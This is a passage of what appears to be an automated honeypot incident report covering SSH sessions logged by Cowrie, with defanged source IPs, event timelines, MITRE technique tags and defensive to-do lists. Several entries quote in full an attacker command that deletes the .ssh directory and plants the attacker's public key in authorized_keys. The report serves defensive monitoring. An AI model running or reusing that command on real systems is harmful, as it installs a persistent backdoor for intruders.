| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:28:39` | `cowrie.session.connect` |
| `2026-03-21 01:28:39` | `cowrie.client.version` |
| `2026-03-21 01:28:39` | `cowrie.client.kex` |
| `2026-03-21 01:28:39` | `cowrie.login.success` |
| `2026-03-21 01:28:40` | `cowrie.session.params` |
| `2026-03-21 01:28:40` | `cowrie.command.input` |
| `2026-03-21 01:28:40` | `cowrie.command.failed` |
| `2026-03-21 01:28:40` | `cowrie.log.closed` |
| `2026-03-21 01:28:40` | `cowrie.session.params` |
| `2026-03-21 01:28:40` | `cowrie.command.input` |
| `2026-03-21 01:28:40` | `cowrie.session.file_download` |
| `2026-03-21 01:28:40` | `cowrie.log.closed` |
| `2026-03-21 01:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.222.205[.]160` to AbuseIPDB if not already reported
- [ ] Block `8.222.205[.]160` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f4d7b5e7808

| Field | Detail |
|---|---|
| **Source IP** | `148.227.90[.]210` |
| **First Seen** | 2026-03-21 01:28 |
| **Last Seen** | 2026-03-21 01:33 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:28:41` | `cowrie.session.connect` |
| `2026-03-21 01:28:42` | `cowrie.client.version` |
| `2026-03-21 01:28:42` | `cowrie.client.kex` |
| `2026-03-21 01:28:45` | `cowrie.login.success` |
| `2026-03-21 01:28:45` | `cowrie.direct-tcpip.request` |
| `2026-03-21 01:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.227.90[.]210` to AbuseIPDB if not already reported
- [ ] Block `148.227.90[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a440567a97e3

| Field | Detail |
|---|---|
| **Source IP** | `8.222.205[.]160` |
| **First Seen** | 2026-03-21 01:28 |
| **Last Seen** | 2026-03-21 01:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:28:42` | `cowrie.session.connect` |
| `2026-03-21 01:28:42` | `cowrie.client.version` |
| `2026-03-21 01:28:42` | `cowrie.client.kex` |
| `2026-03-21 01:28:42` | `cowrie.login.success` |
| `2026-03-21 01:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.222.205[.]160` to AbuseIPDB if not already reported
- [ ] Block `8.222.205[.]160` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aabf42193dbd

| Field | Detail |
|---|---|
| **Source IP** | `87.251.69[.]126` |
| **First Seen** | 2026-03-21 01:28 |
| **Last Seen** | 2026-03-21 01:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:28:55` | `cowrie.session.connect` |
| `2026-03-21 01:28:55` | `cowrie.client.version` |
| `2026-03-21 01:28:55` | `cowrie.client.kex` |
| `2026-03-21 01:28:56` | `cowrie.login.success` |
| `2026-03-21 01:28:56` | `cowrie.direct-tcpip.request` |
| `2026-03-21 01:29:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.251.69[.]126` to AbuseIPDB if not already reported
- [ ] Block `87.251.69[.]126` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a03b47bea8e1

| Field | Detail |
|---|---|
| **Source IP** | `81.90.25[.]79` |
| **First Seen** | 2026-03-21 01:29 |
| **Last Seen** | 2026-03-21 01:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:29:27` | `cowrie.session.connect` |
| `2026-03-21 01:29:27` | `cowrie.client.version` |
| `2026-03-21 01:29:27` | `cowrie.client.kex` |
| `2026-03-21 01:29:28` | `cowrie.login.success` |
| `2026-03-21 01:29:28` | `cowrie.direct-tcpip.request` |
| `2026-03-21 01:29:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.90.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `81.90.25[.]79` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7facffe31fb4

| Field | Detail |
|---|---|
| **Source IP** | `47.242.68[.]55` |
| **First Seen** | 2026-03-21 01:29 |
| **Last Seen** | 2026-03-21 01:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:29:45` | `cowrie.session.connect` |
| `2026-03-21 01:29:45` | `cowrie.client.version` |
| `2026-03-21 01:29:45` | `cowrie.client.kex` |
| `2026-03-21 01:29:45` | `cowrie.login.success` |
| `2026-03-21 01:29:46` | `cowrie.session.params` |
| `2026-03-21 01:29:46` | `cowrie.command.input` |
| `2026-03-21 01:29:46` | `cowrie.command.failed` |
| `2026-03-21 01:29:46` | `cowrie.log.closed` |
| `2026-03-21 01:29:46` | `cowrie.session.params` |
| `2026-03-21 01:29:46` | `cowrie.command.input` |
| `2026-03-21 01:29:46` | `cowrie.session.file_download` |
| `2026-03-21 01:29:46` | `cowrie.log.closed` |
| `2026-03-21 01:29:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.68[.]55` to AbuseIPDB if not already reported
- [ ] Block `47.242.68[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3276cea5e472

| Field | Detail |
|---|---|
| **Source IP** | `47.242.68[.]55` |
| **First Seen** | 2026-03-21 01:29 |
| **Last Seen** | 2026-03-21 01:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:29:48` | `cowrie.session.connect` |
| `2026-03-21 01:29:48` | `cowrie.client.version` |
| `2026-03-21 01:29:48` | `cowrie.client.kex` |
| `2026-03-21 01:29:48` | `cowrie.login.success` |
| `2026-03-21 01:29:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.68[.]55` to AbuseIPDB if not already reported
- [ ] Block `47.242.68[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9dc2daf329d

| Field | Detail |
|---|---|
| **Source IP** | `8.222.205[.]160` |
| **First Seen** | 2026-03-21 01:30 |
| **Last Seen** | 2026-03-21 01:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:30:25` | `cowrie.session.connect` |
| `2026-03-21 01:30:25` | `cowrie.client.version` |
| `2026-03-21 01:30:26` | `cowrie.client.kex` |
| `2026-03-21 01:30:26` | `cowrie.login.success` |
| `2026-03-21 01:30:26` | `cowrie.session.params` |
| `2026-03-21 01:30:26` | `cowrie.command.input` |
| `2026-03-21 01:30:26` | `cowrie.command.failed` |
| `2026-03-21 01:30:26` | `cowrie.log.closed` |
| `2026-03-21 01:30:26` | `cowrie.session.params` |
| `2026-03-21 01:30:26` | `cowrie.command.input` |
| `2026-03-21 01:30:26` | `cowrie.session.file_download` |
| `2026-03-21 01:30:26` | `cowrie.log.closed` |
| `2026-03-21 01:30:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.222.205[.]160` to AbuseIPDB if not already reported
- [ ] Block `8.222.205[.]160` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adc56a3c9bb8

| Field | Detail |
|---|---|
| **Source IP** | `8.222.205[.]160` |
| **First Seen** | 2026-03-21 01:30 |
| **Last Seen** | 2026-03-21 01:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:30:28` | `cowrie.session.connect` |
| `2026-03-21 01:30:28` | `cowrie.client.version` |
| `2026-03-21 01:30:28` | `cowrie.client.kex` |
| `2026-03-21 01:30:28` | `cowrie.login.success` |
| `2026-03-21 01:30:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.222.205[.]160` to AbuseIPDB if not already reported
- [ ] Block `8.222.205[.]160` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32730b56b276

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]9` |
| **First Seen** | 2026-03-21 01:31 |
| **Last Seen** | 2026-03-21 01:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:31:31` | `cowrie.session.connect` |
| `2026-03-21 01:31:32` | `cowrie.client.version` |
| `2026-03-21 01:31:32` | `cowrie.client.kex` |
| `2026-03-21 01:31:33` | `cowrie.login.success` |
| `2026-03-21 01:31:33` | `cowrie.direct-tcpip.request` |
| `2026-03-21 01:31:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]9` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]9` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e1c92ccae73

| Field | Detail |
|---|---|
| **Source IP** | `222.216.2[.]74` |
| **First Seen** | 2026-03-21 01:31 |
| **Last Seen** | 2026-03-21 01:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:31:33` | `cowrie.session.connect` |
| `2026-03-21 01:31:34` | `cowrie.client.version` |
| `2026-03-21 01:31:34` | `cowrie.client.kex` |
| `2026-03-21 01:31:35` | `cowrie.login.success` |
| `2026-03-21 01:31:36` | `cowrie.direct-tcpip.request` |
| `2026-03-21 01:31:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.216.2[.]74` to AbuseIPDB if not already reported
- [ ] Block `222.216.2[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9ac32b40cf7

| Field | Detail |
|---|---|
| **Source IP** | `47.242.68[.]55` |
| **First Seen** | 2026-03-21 01:31 |
| **Last Seen** | 2026-03-21 01:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:31:39` | `cowrie.session.connect` |
| `2026-03-21 01:31:39` | `cowrie.client.version` |
| `2026-03-21 01:31:39` | `cowrie.client.kex` |
| `2026-03-21 01:31:39` | `cowrie.login.success` |
| `2026-03-21 01:31:39` | `cowrie.session.params` |
| `2026-03-21 01:31:39` | `cowrie.command.input` |
| `2026-03-21 01:31:39` | `cowrie.command.failed` |
| `2026-03-21 01:31:39` | `cowrie.log.closed` |
| `2026-03-21 01:31:40` | `cowrie.session.params` |
| `2026-03-21 01:31:40` | `cowrie.command.input` |
| `2026-03-21 01:31:40` | `cowrie.session.file_download` |
| `2026-03-21 01:31:40` | `cowrie.log.closed` |
| `2026-03-21 01:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.68[.]55` to AbuseIPDB if not already reported
- [ ] Block `47.242.68[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72a55e5b2c65

| Field | Detail |
|---|---|
| **Source IP** | `110.39.181[.]194` |
| **First Seen** | 2026-03-21 01:31 |
| **Last Seen** | 2026-03-21 01:31 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:31:42` | `cowrie.session.connect` |
| `2026-03-21 01:31:43` | `cowrie.client.version` |
| `2026-03-21 01:31:43` | `cowrie.client.kex` |
| `2026-03-21 01:31:50` | `cowrie.login.success` |
| `2026-03-21 01:31:52` | `cowrie.direct-tcpip.request` |
| `2026-03-21 01:31:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.39.181[.]194` to AbuseIPDB if not already reported
- [ ] Block `110.39.181[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b9757bb3986

| Field | Detail |
|---|---|
| **Source IP** | `47.242.68[.]55` |
| **First Seen** | 2026-03-21 01:31 |
| **Last Seen** | 2026-03-21 01:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:31:42` | `cowrie.session.connect` |
| `2026-03-21 01:31:42` | `cowrie.client.version` |
| `2026-03-21 01:31:42` | `cowrie.client.kex` |
| `2026-03-21 01:31:42` | `cowrie.login.success` |
| `2026-03-21 01:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.68[.]55` to AbuseIPDB if not already reported
- [ ] Block `47.242.68[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-484f338879d9

| Field | Detail |
|---|---|
| **Source IP** | `171.233.91[.]172` |
| **First Seen** | 2026-03-21 01:31 |
| **Last Seen** | 2026-03-21 01:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:31:56` | `cowrie.session.connect` |
| `2026-03-21 01:31:57` | `cowrie.client.version` |
| `2026-03-21 01:31:57` | `cowrie.client.kex` |
| `2026-03-21 01:31:58` | `cowrie.login.success` |
| `2026-03-21 01:31:58` | `cowrie.direct-tcpip.request` |
| `2026-03-21 01:32:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.233.91[.]172` to AbuseIPDB if not already reported
- [ ] Block `171.233.91[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d269dc225973

| Field | Detail |
|---|---|
| **Source IP** | `113.176.216[.]199` |
| **First Seen** | 2026-03-21 01:32 |
| **Last Seen** | 2026-03-21 01:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:32:03` | `cowrie.session.connect` |
| `2026-03-21 01:32:03` | `cowrie.client.version` |
| `2026-03-21 01:32:03` | `cowrie.client.kex` |
| `2026-03-21 01:32:05` | `cowrie.login.success` |
| `2026-03-21 01:32:05` | `cowrie.direct-tcpip.request` |
| `2026-03-21 01:32:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.176.216[.]199` to AbuseIPDB if not already reported
- [ ] Block `113.176.216[.]199` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bacb86df917

| Field | Detail |
|---|---|
| **Source IP** | `218.15.224[.]102` |
| **First Seen** | 2026-03-21 01:32 |
| **Last Seen** | 2026-03-21 01:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:32:31` | `cowrie.session.connect` |
| `2026-03-21 01:32:31` | `cowrie.client.version` |
| `2026-03-21 01:32:31` | `cowrie.client.kex` |
| `2026-03-21 01:32:33` | `cowrie.login.success` |
| `2026-03-21 01:32:33` | `cowrie.direct-tcpip.request` |
| `2026-03-21 01:32:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.15.224[.]102` to AbuseIPDB if not already reported
- [ ] Block `218.15.224[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12fcf89dfc17

| Field | Detail |
|---|---|
| **Source IP** | `47.242.68[.]55` |
| **First Seen** | 2026-03-21 01:33 |
| **Last Seen** | 2026-03-21 01:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:33:30` | `cowrie.session.connect` |
| `2026-03-21 01:33:30` | `cowrie.client.version` |
| `2026-03-21 01:33:30` | `cowrie.client.kex` |
| `2026-03-21 01:33:31` | `cowrie.login.success` |
| `2026-03-21 01:33:31` | `cowrie.session.params` |
| `2026-03-21 01:33:31` | `cowrie.command.input` |
| `2026-03-21 01:33:31` | `cowrie.command.failed` |
| `2026-03-21 01:33:31` | `cowrie.log.closed` |
| `2026-03-21 01:33:31` | `cowrie.session.params` |
| `2026-03-21 01:33:31` | `cowrie.command.input` |
| `2026-03-21 01:33:32` | `cowrie.session.file_download` |
| `2026-03-21 01:33:32` | `cowrie.log.closed` |
| `2026-03-21 01:33:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.68[.]55` to AbuseIPDB if not already reported
- [ ] Block `47.242.68[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3899abf7264

| Field | Detail |
|---|---|
| **Source IP** | `47.242.68[.]55` |
| **First Seen** | 2026-03-21 01:33 |
| **Last Seen** | 2026-03-21 01:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:33:33` | `cowrie.session.connect` |
| `2026-03-21 01:33:33` | `cowrie.client.version` |
| `2026-03-21 01:33:33` | `cowrie.client.kex` |
| `2026-03-21 01:33:34` | `cowrie.login.success` |
| `2026-03-21 01:33:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.68[.]55` to AbuseIPDB if not already reported
- [ ] Block `47.242.68[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06d22a24f39d

| Field | Detail |
|---|---|
| **Source IP** | `113.11.34[.]221` |
| **First Seen** | 2026-03-21 01:35 |
| **Last Seen** | 2026-03-21 01:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:35:06` | `cowrie.session.connect` |
| `2026-03-21 01:35:07` | `cowrie.client.version` |
| `2026-03-21 01:35:07` | `cowrie.client.kex` |
| `2026-03-21 01:35:08` | `cowrie.login.success` |
| `2026-03-21 01:35:09` | `cowrie.direct-tcpip.request` |
| `2026-03-21 01:35:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.11.34[.]221` to AbuseIPDB if not already reported
- [ ] Block `113.11.34[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dccb34e2b99c

| Field | Detail |
|---|---|
| **Source IP** | `191.37.18[.]250` |
| **First Seen** | 2026-03-21 01:35 |
| **Last Seen** | 2026-03-21 01:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:35:18` | `cowrie.session.connect` |
| `2026-03-21 01:35:19` | `cowrie.client.version` |
| `2026-03-21 01:35:19` | `cowrie.client.kex` |
| `2026-03-21 01:35:22` | `cowrie.login.success` |
| `2026-03-21 01:35:23` | `cowrie.direct-tcpip.request` |
